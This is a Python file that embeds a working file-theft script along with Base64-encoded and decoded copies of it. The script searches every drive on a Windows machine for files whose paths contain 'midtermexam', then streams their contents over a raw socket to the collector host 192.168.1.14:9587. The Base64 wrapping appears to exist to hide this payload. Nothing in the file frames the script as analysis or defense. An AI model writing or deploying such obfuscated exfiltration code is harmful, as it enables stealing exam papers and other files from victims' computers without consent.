import base64

encode = """
# -*- coding: utf-8 -*-
import os
import re
import socket
import hashlib
import time
drives = os.popen('wmic logicaldisk get caption')
drives = [drive.strip() for drive in drives if drive.strip()]
exam_file_list = []
for drive in drives:
    path = os.path.join(drive, "\\\\")
    for dirPath, dirNames, fileNames in os.walk(path):
        for file in fileNames:
            if re.search("midtermexam", os.path.join(dirPath, file)) and not file.endswith('.lnk'):
                exam_file_list.append(os.path.join(dirPath, file))
exam_file_list = [elem for elem in exam_file_list if not elem.startswith('\\\\')]
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(("192.168.1.14", 9587))
hash_dict = {}
for exam_file in exam_file_list:
    with open(exam_file, "rb") as f:
        md5 = hashlib.md5(f.read()).hexdigest()
    if md5 in hash_dict:
        continue
    file_size = os.path.getsize(exam_file)
    client_socket.sendall(f"{os.path.basename(exam_file)}\\n{file_size}".encode())
    with open(exam_file, "rb") as f:
        while True:
            data = f.read(1048576)
            if not data:
                break
            client_socket.sendall(data)
            time.sleep(3)
    hash_dict[md5] = exam_file
client_socket.sendall(b"over")
client_socket.close()
"""

# Convert code to bytes and encode using Base64
blob = base64.b64encode(encode.encode('utf-8')).decode('utf-8')
# Print the encoded string
print(blob)

decode = "CiMgLSotIGNvZGluZzogdXRmLTggLSotCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0IHNvY2tldAppbXBvcnQgaGFzaGxpYgppbXBvcnQgdGltZQpkcml2ZXMgPSBvcy5wb3Blbignd21pYyBsb2dpY2FsZGlzayBnZXQgY2FwdGlvbicpCmRyaXZlcyA9IFtkcml2ZS5zdHJpcCgpIGZvciBkcml2ZSBpbiBkcml2ZXMgaWYgZHJpdmUuc3RyaXAoKV0KZXhhbV9maWxlX2xpc3QgPSBbXQpmb3IgZHJpdmUgaW4gZHJpdmVzOgogICAgcGF0aCA9IG9zLnBhdGguam9pbihkcml2ZSwgIlxcIikKICAgIGZvciBkaXJQYXRoLCBkaXJOYW1lcywgZmlsZU5hbWVzIGluIG9zLndhbGsocGF0aCk6CiAgICAgICAgZm9yIGZpbGUgaW4gZmlsZU5hbWVzOgogICAgICAgICAgICBpZiByZS5zZWFyY2goIm1pZHRlcm1leGFtIiwgb3MucGF0aC5qb2luKGRpclBhdGgsIGZpbGUpKSBhbmQgbm90IGZpbGUuZW5kc3dpdGgoJy5sbmsnKToKICAgICAgICAgICAgICAgIGV4YW1fZmlsZV9saXN0LmFwcGVuZChvcy5wYXRoLmpvaW4oZGlyUGF0aCwgZmlsZSkpCmV4YW1fZmlsZV9saXN0ID0gW2VsZW0gZm9yIGVsZW0gaW4gZXhhbV9maWxlX2xpc3QgaWYgbm90IGVsZW0uc3RhcnRzd2l0aCgnXFwnKV0KY2xpZW50X3NvY2tldCA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKY2xpZW50X3NvY2tldC5jb25uZWN0KCgiMTkyLjE2OC4xLjE0IiwgOTU4NykpCmhhc2hfZGljdCA9IHt9CmZvciBleGFtX2ZpbGUgaW4gZXhhbV9maWxlX2xpc3Q6CiAgICB3aXRoIG9wZW4oZXhhbV9maWxlLCAicmIiKSBhcyBmOgogICAgICAgIG1kNSA9IGhhc2hsaWIubWQ1KGYucmVhZCgpKS5oZXhkaWdlc3QoKQogICAgaWYgbWQ1IGluIGhhc2hfZGljdDoKICAgICAgICBjb250aW51ZQogICAgZmlsZV9zaXplID0gb3MucGF0aC5nZXRzaXplKGV4YW1fZmlsZSkKICAgIGNsaWVudF9zb2NrZXQuc2VuZGFsbChmIntvcy5wYXRoLmJhc2VuYW1lKGV4YW1fZmlsZSl9XG57ZmlsZV9zaXplfSIuZW5jb2RlKCkpCiAgICB3aXRoIG9wZW4oZXhhbV9maWxlLCAicmIiKSBhcyBmOgogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIGRhdGEgPSBmLnJlYWQoMTA0ODU3NikKICAgICAgICAgICAgaWYgbm90IGRhdGE6CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBjbGllbnRfc29ja2V0LnNlbmRhbGwoZGF0YSkKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgaGFzaF9kaWN0W21kNV0gPSBleGFtX2ZpbGUKY2xpZW50X3NvY2tldC5zZW5kYWxsKGIib3ZlciIpCmNsaWVudF9zb2NrZXQuY2xvc2UoKQo="
decoded = base64.b64decode(decode).decode("UTF-8")
print(decoded)
